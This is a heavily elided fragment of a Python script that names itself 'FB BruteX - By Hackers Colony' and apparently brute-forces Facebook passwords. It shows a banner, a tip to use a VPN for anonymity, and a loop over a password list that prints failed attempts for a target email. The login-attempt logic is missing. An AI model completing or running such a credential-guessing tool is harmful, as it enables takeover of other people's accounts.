...
\033[1;31m                  :: F B  B r u t e X - By Hackers Colony ::
\033[0m
'''
animate(banner)
...
logo = '''\033[1;32m
          ...
          | $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/ /$$/\  $$
          | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$  \ $$
          |_______/ |__/       \______/    \___/   \_______/|__/  |__/
...
print("[+] Use VPN for better anonymity.\n\033[0m")
...
if __name__ == "__main__":
    ...
    for idx, password in enumerate(passwords):
        ...
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(f"\033[1;33mPassword Not Matched {email}: {password}\033[0m")
